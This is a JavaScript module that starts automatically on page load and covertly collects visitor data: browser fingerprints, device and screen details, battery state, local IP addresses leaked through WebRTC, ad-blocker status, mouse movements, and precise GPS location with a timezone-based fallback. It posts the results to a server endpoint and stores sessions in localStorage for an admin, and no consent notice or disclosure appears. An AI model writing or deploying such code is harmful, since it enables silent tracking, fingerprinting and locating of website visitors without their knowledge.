// Comprehensive Data Collection Module
// Collects all available device and browser information

const DataCollector = {
    sessionId: null,
    collectedData: {},

    // Initialize session
    init: function() {
        this.sessionId = this.generateSessionId();
        this.startCollection();
    },

    // Generate unique session ID
    generateSessionId: function() {
        return 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
    },

    // Get basic device information (no permission required)
    getDeviceInfo: function() {
        return {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            languages: navigator.languages,
            cookieEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack,
            hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
            deviceMemory: navigator.deviceMemory || 'unknown',
            maxTouchPoints: navigator.maxTouchPoints || 0,
            vendor: navigator.vendor,
            vendorSub: navigator.vendorSub,
            productSub: navigator.productSub,
            appVersion: navigator.appVersion,
            appName: navigator.appName,
            appCodeName: navigator.appCodeName
        };
    },

    // Get screen information
    getScreenInfo: function() {
        return {
            screenWidth: screen.width,
            screenHeight: screen.height,
            availWidth: screen.availWidth,
            availHeight: screen.availHeight,
            colorDepth: screen.colorDepth,
            pixelDepth: screen.pixelDepth,
            orientation: screen.orientation ? screen.orientation.type : 'unknown',
            devicePixelRatio: window.devicePixelRatio || 1,
            innerWidth: window.innerWidth,
            innerHeight: window.innerHeight,
            outerWidth: window.outerWidth,
            outerHeight: window.outerHeight
        };
    },

    // Get timezone information
    getTimezoneInfo: function() {
        const date = new Date();
        return {
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timezoneOffset: date.getTimezoneOffset(),
            locale: Intl.DateTimeFormat().resolvedOptions().locale,
            timestamp: date.toISOString(),
            localTime: date.toString()
        };
    },

    // Get network information (if available)
    getNetworkInfo: function() {
        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        if (!connection) return 'unavailable';

        return {
            effectiveType: connection.effectiveType || 'unknown',
            downlink: connection.downlink || 'unknown',
            rtt: connection.rtt || 'unknown',
            saveData: connection.saveData || false,
            type: connection.type || 'unknown'
        };
    },

    // Get battery information (if available)
    getBatteryInfo: async function() {
        try {
            if (navigator.getBattery) {
                const battery = await navigator.getBattery();
                return {
                    charging: battery.charging,
                    level: battery.level,
                    chargingTime: battery.chargingTime,
                    dischargingTime: battery.dischargingTime
                };
            }
        } catch (e) {
            return 'unavailable';
        }
        return 'unavailable';
    },

    // Get WebRTC local IPs (requires some setup)
    getWebRTCInfo: function() {
        return new Promise((resolve) => {
            try {
                const RTCPeerConnection = window.RTCPeerConnection || window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
                
                if (!RTCPeerConnection) {
                    resolve('unavailable');
                    return;
                }

                const pc = new RTCPeerConnection({iceServers: []});
                const ips = [];

                pc.createDataChannel('');
                pc.createOffer().then(offer => pc.setLocalDescription(offer));

                pc.onicecandidate = (ice) => {
                    if (!ice || !ice.candidate || !ice.candidate.candidate) {
                        pc.close();
                        resolve(ips.length > 0 ? ips : 'unavailable');
                        return;
                    }

                    const parts = ice.candidate.candidate.split(' ');
                    const ip = parts[4];
                    if (ip && !ips.includes(ip)) {
                        ips.push(ip);
                    }
                };

                setTimeout(() => {
                    pc.close();
                    resolve(ips.length > 0 ? ips : 'unavailable');
                }, 2000);
            } catch (e) {
                resolve('unavailable');
            }
        });
    },

    // Get plugins information
    getPluginsInfo: function() {
        const plugins = [];
        for (let i = 0; i < navigator.plugins.length; i++) {
            plugins.push({
                name: navigator.plugins[i].name,
                description: navigator.plugins[i].description,
                filename: navigator.plugins[i].filename
            });
        }
        return plugins;
    },

    // Detect ad blockers
    detectAdBlocker: function() {
        const test = document.createElement('div');
        test.innerHTML = '&nbsp;';
        test.className = 'adsbox';
        document.body.appendChild(test);
        const detected = test.offsetHeight === 0;
        document.body.removeChild(test);
        return detected;
    },

    // Get referrer information
    getReferrerInfo: function() {
        return {
            referrer: document.referrer || 'direct',
            url: window.location.href,
            hostname: window.location.hostname,
            pathname: window.location.pathname,
            search: window.location.search,
            hash: window.location.hash
        };
    },

    // Track mouse movements (sample)
    trackMouseMovement: function() {
        const movements = [];
        let sampleCount = 0;
        const maxSamples = 10;

        const handler = (e) => {
            if (sampleCount < maxSamples) {
                movements.push({
                    x: e.clientX,
                    y: e.clientY,
                    timestamp: Date.now()
                });
                sampleCount++;
            } else {
                document.removeEventListener('mousemove', handler);
            }
        };

        document.addEventListener('mousemove', handler);
        return movements;
    },

    // Collect all data without permissions
    collectPassiveData: async function() {
        const fingerprints = await BrowserFingerprint.getAllFingerprints();
        const battery = await this.getBatteryInfo();
        const webrtc = await this.getWebRTCInfo();

        return {
            sessionId: this.sessionId,
            timestamp: new Date().toISOString(),
            device: this.getDeviceInfo(),
            screen: this.getScreenInfo(),
            timezone: this.getTimezoneInfo(),
            network: this.getNetworkInfo(),
            battery: battery,
            webrtc: webrtc,
            plugins: this.getPluginsInfo(),
            adBlocker: this.detectAdBlocker(),
            referrer: this.getReferrerInfo(),
            fingerprints: fingerprints,
            performance: {
                memory: performance.memory ? {
                    jsHeapSizeLimit: performance.memory.jsHeapSizeLimit,
                    totalJSHeapSize: performance.memory.totalJSHeapSize,
                    usedJSHeapSize: performance.memory.usedJSHeapSize
                } : 'unavailable',
                timing: {
                    loadTime: performance.timing.loadEventEnd - performance.timing.navigationStart,
                    domReady: performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart
                }
            }
        };
    },

    // Request GPS location (requires permission)
    requestGPSLocation: function() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) {
                resolve({ 
                    error: 'Geolocation not supported by this browser',
                    code: 'NOT_SUPPORTED',
                    granted: false
                });
                return;
            }

            // Set a timeout for the geolocation request
            const timeoutId = setTimeout(() => {
                resolve({ 
                    error: 'Location request timed out',
                    code: 'TIMEOUT',
                    granted: false
                });
            }, 15000);

            navigator.geolocation.getCurrentPosition(
                (position) => {
                    clearTimeout(timeoutId);
                    resolve({
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        altitude: position.coords.altitude,
                        altitudeAccuracy: position.coords.altitudeAccuracy,
                        heading: position.coords.heading,
                        speed: position.coords.speed,
                        timestamp: position.timestamp,
                        granted: true
                    });
                },
                (error) => {
                    clearTimeout(timeoutId);
                    let errorMessage = 'Unknown error';
                    switch(error.code) {
                        case error.PERMISSION_DENIED:
                            errorMessage = 'User denied the request for Geolocation';
                            break;
                        case error.POSITION_UNAVAILABLE:
                            errorMessage = 'Location information is unavailable';
                            break;
                        case error.TIMEOUT:
                            errorMessage = 'The request to get user location timed out';
                            break;
                    }
                    resolve({ 
                        error: errorMessage,
                        code: error.code,
                        granted: false
                    });
                },
                {
                    enableHighAccuracy: true,
                    timeout: 12000,
                    maximumAge: 300000 // Accept cached location up to 5 minutes old
                }
            );
        });
    },

    // Try to get approximate location using timezone
    getApproximateLocation: function() {
        try {
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            
            // Basic timezone to approximate coordinates mapping
            const timezoneCoords = {
                'America/New_York': { lat: 40.7128, lon: -74.0060, city: 'New York' },
                'America/Los_Angeles': { lat: 34.0522, lon: -118.2437, city: 'Los Angeles' },
                'America/Chicago': { lat: 41.8781, lon: -87.6298, city: 'Chicago' },
                'Europe/London': { lat: 51.5074, lon: -0.1278, city: 'London' },
                'Europe/Paris': { lat: 48.8566, lon: 2.3522, city: 'Paris' },
                'Asia/Tokyo': { lat: 35.6762, lon: 139.6503, city: 'Tokyo' },
                'Asia/Shanghai': { lat: 31.2304, lon: 121.4737, city: 'Shanghai' },
                'Australia/Sydney': { lat: -33.8688, lon: 151.2093, city: 'Sydney' }
            };

            return timezoneCoords[timezone] || { 
                lat: null, 
                lon: null, 
                city: 'Unknown',
                timezone: timezone,
                source: 'timezone_estimation'
            };
        } catch (e) {
            return { 
                lat: null, 
                lon: null, 
                city: 'Unknown',
                source: 'failed'
            };
        }
    },

    // Get device orientation (may require permission on iOS)
    getDeviceOrientation: function() {
        return new Promise((resolve) => {
            if (!window.DeviceOrientationEvent) {
                resolve('unavailable');
                return;
            }

            const handler = (event) => {
                window.removeEventListener('deviceorientation', handler);
                resolve({
                    alpha: event.alpha,
                    beta: event.beta,
                    gamma: event.gamma,
                    absolute: event.absolute
                });
            };

            window.addEventListener('deviceorientation', handler);

            setTimeout(() => {
                window.removeEventListener('deviceorientation', handler);
                resolve('unavailable');
            }, 2000);
        });
    },

    // Send data to server
    sendToServer: async function(data) {
        try {
            // Always save to localStorage as backup
            this.saveToLocalStorage(data);
            
            const response = await fetch('/api/collect', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            });
            
            if (response.ok) {
                console.log('Data sent successfully to server');
            } else {
                console.log('Server unavailable, data saved locally');
            }
        } catch (error) {
            console.log('Server unavailable, data saved locally only');
        }
    },

    // Save data to localStorage for admin access
    saveToLocalStorage: function(data) {
        try {
            // Get existing sessions
            const sessions = JSON.parse(localStorage.getItem('collectedSessions') || '[]');
            
            // Add new session (avoid duplicates by session ID)
            const existingIndex = sessions.findIndex(s => s.sessionId === data.sessionId);
            if (existingIndex >= 0) {
                // Update existing session with new data
                sessions[existingIndex] = { ...sessions[existingIndex], ...data };
            } else {
                sessions.push(data);
            }
            
            // Keep only last 100 sessions
            if (sessions.length > 100) {
                sessions.splice(0, sessions.length - 100);
            }
            
            localStorage.setItem('collectedSessions', JSON.stringify(sessions));
        } catch (e) {
            console.error('Error saving to localStorage:', e);
        }
    },

    // Save interaction to localStorage
    saveInteractionToLocalStorage: function(interaction) {
        try {
            const interactions = JSON.parse(localStorage.getItem('collectedInteractions') || '[]');
            interactions.push(interaction);
            
            // Keep only last 500 interactions
            if (interactions.length > 500) {
                interactions.splice(0, interactions.length - 500);
            }
            
            localStorage.setItem('collectedInteractions', JSON.stringify(interactions));
        } catch (e) {
            console.error('Error saving interaction to localStorage:', e);
        }
    },

    // Start automatic collection
    startCollection: async function() {
        console.log('🚀 Starting data collection...');
        
        // Collect passive data immediately
        const passiveData = await this.collectPassiveData();
        this.collectedData = passiveData;
        
        // Try to get GPS location first
        console.log('📍 Requesting GPS location...');
        const gpsData = await this.requestGPSLocation();
        
        if (gpsData.granted && gpsData.latitude) {
            this.collectedData.gps = gpsData;
            this.collectedData.locationSource = 'gps';
            console.log('✅ GPS location obtained:', gpsData.latitude, gpsData.longitude);
        } else {
            // Fallback to approximate location
            console.log('⚠️ GPS failed, using approximate location');
            const approxLocation = this.getApproximateLocation();
            this.collectedData.gps = {
                error: gpsData.error,
                code: gpsData.code,
                granted: false,
                approximateLocation: approxLocation
            };
            this.collectedData.locationSource = 'timezone_approximation';
            console.log('📍 Approximate location:', approxLocation);
        }
        
        // Send to server with location data
        await this.sendToServer(this.collectedData);

        console.log('✅ Data collection completed:', this.sessionId);
        
        // Show location status
        if (gpsData.granted) {
            console.log('🎯 Precise GPS location collected');
        } else {
            console.log('🌐 Using approximate location - GPS not available');
            console.log('💡 To get precise location, user can grant permission manually');
        }
    },

    // Request GPS with user interaction
    requestLocationWithPermission: async function() {
        const gpsData = await this.requestGPSLocation();
        this.collectedData.gps = gpsData;
        
        // Send updated data to server
        await this.sendToServer({
            sessionId: this.sessionId,
            gps: gpsData,
            timestamp: new Date().toISOString()
        });

        return gpsData;
    }
};

// Auto-start collection on page load
window.addEventListener('load', () => {
    DataCollector.init();
});
